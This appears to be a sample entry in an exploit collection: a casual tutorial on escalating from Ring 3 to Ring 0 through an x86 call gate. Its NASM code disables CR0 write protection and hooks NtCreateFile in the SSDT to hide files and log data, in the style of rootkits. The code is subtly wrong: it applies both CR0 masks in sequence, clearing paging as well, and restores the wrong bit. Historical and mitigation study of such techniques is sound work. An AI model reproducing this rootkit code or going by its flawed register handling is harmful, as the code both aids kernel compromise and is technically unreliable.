# Sample 1: Ring 3 to Ring 0 via Call Gate

**Category**: Privilege Escalation / Kernel Exploitation
**Relevance Period**: ~1990s - Mid 2000s (Effectively mitigated on modern OSes)

## Overview

Alright, let's talk about the holy grail of local exploits: jumping from unprivileged userland (Ring 3) to the god-mode kerneland (Ring 0). Back in the day, one of the "legit" ways to do this was abusing the **Call Gate** mechanism. Intel designed Call Gates to allow controlled transitions from lower privilege levels to higher ones (e.g., for ring 3 apps to call ring 0 OS functions). Obviously, we're about to subvert that control.

The plan is simple:
1.  Modify the **Global Descriptor Table (GDT)** to install a custom Call Gate descriptor that points to our shellcode.
2.  Trigger a far call (`CALL FAR`) to that gate.
3.  The CPU, following the Intel architecture rules, will happily switch our privilege level to Ring 0 and jump to our code.
4.  **PROFIT!** (Until the OS realizes something is horribly wrong).

This is a classic technique used by rootkits like **e.g., Hacker Defender** or **FU** to disable kernel memory protection (`CR0` write protection) and then hook system structures like the **SSDT (System Service Descriptor Table)**.

## The Code (NASM-style ASM)

```asm
BITS 32
section .text
org 0x0 ; This might be adjusted by the loader

; This code assumes we're in Ring 3 and we've found a way to map the GDT or have a vulnerable driver to write to it.
; This is often the hardest part. Let's pretend we've already set up a Call Gate at selector 0x28:0x? in the GDT.

start:
    mov eax, 0xdeadbeef          ; Replace this with the actual address of our Ring 0 payload
    push eax                     ; Push the target offset (for the retf later, just in case)

    ; Let's try to trigger the call gate at selector 0x28, offset 0x00.
    ; A call gate descriptor defines the code segment to use and the offset within it.
    ; The actual ASM instruction is mundane, the magic is in the descriptor it points to.
    call 0x28:0x0000             ; This far call is the key. 0x28 is the selector pointing to our Call Gate descriptor.

    ; If the call returns (our ring0 code does a retf), we end up here.
    ; But let's be real, a successful ring0 payload probably isn't returning nicely.
    ret

; ----------------------------------------------------------------------------
; This is the code that will execute in RING 0 after the call gate is triggered.
; It's placed elsewhere in memory, and the Call Gate points to it.
; ----------------------------------------------------------------------------
ring0_payload:
    ; First order of business: disable memory protection!
    mov eax, cr0
    and eax, 0x7FFFFFFF          ; Clear the PG bit (paging) - OR -
    and eax, 0xFFFEFFFF          ; More common: Clear the WP bit (Write Protect) to allow writing to read-only pages
    mov cr0, eax

    ; Now we can patch the kernel! Let's hook a common function in the SSDT, e.g., NtCreateFile.
    ; This is a classic SSDT hooking technique.
    mov edi, [ds:0xdeadc0de]     ; Replace 0xdeadc0de with the address of the SSDT and the index for NtCreateFile
    mov esi, our_hooked_function
    mov [edi], esi               ; Write our function address over the original in the SSDT

    ; Re-enable protection (optional, to avoid detection)
    mov eax, cr0
    or  eax, 0x1000              ; Set the WP bit again
    mov cr0, eax

    ; Get the hell out of Dodge. We need to return properly to Ring 3.
    retf                         ; Far return will pop CS:IP and potentially pop privilege level back to 3

our_hooked_function:
    ; Our malicious NtCreateFile hook goes here.
    ; Check filename, hide files, log data, etc.
    jmp [original_function]      ; Jump back to the real NtCreateFile

original_function dd 0xfeedf00d  ; This would be filled with the original address
```

## So, What's The Catch?

Modern systems absolutely wreck this technique:
1.  **PatchGuard (Kernel Patch Protection)**: On x64 Windows, this will detect modifications to critical kernel structures like the GDT or SSDT and bluescreen immediately. GG.
2.  **SMEP (Supervisor Mode Execution Prevention)**: Prevents the kernel from executing code from user-space pages (like our `ring0_payload` if it's in a userland memory). Trying to do this on a CPU with SMEP will #PF.
3.  **SMAP (Supervisor Mode Access Prevention)**: Prevents the kernel from even *reading* user-space pages. Double #PF.
4.  **KASLR (Kernel Address Space Layout Randomization)**: Makes finding the GDT, SSDT, and other targets a guessing game.

## CTF & Practical Applications

While dead in modern malware, this knowledge is gold for:
*   **Old-School CTF Challenges**: Especially "ring0" or "kernel pwn" challenges in categories like `Pwn` or `Reversing`.
*   **Understanding Mitigations**: To understand *why* SMEP/SMAP/PatchGuard were created, you need to understand the attacks they prevent.
*   **Historical Research**: Understanding the evolution of malware and OS security.

## References & Further Reading

1.  **[Intel SDM, Vol. 3A, Chapter 5.8.3: Call Gates](https://www.intel.com/content/www/us/en/developer/articles/technical/intel-sdm.html)** - The official word from Intel.
2.  **[OSDev Wiki: Call Gate](https://wiki.osdev.org/Call_Gate)** - A more practical explanation.
3.  **[Unauthorized Windows 95](https://www.amazon.com/Unauthorized-Windows-95-Developer-Resource-Kit/dp/0764580074)** - A classic book covering these low-level mechanics for Win9x.
4.  **"Subverting the Windows Kernel" by Greg Hoglund** - The bible for this era of rootkit development.
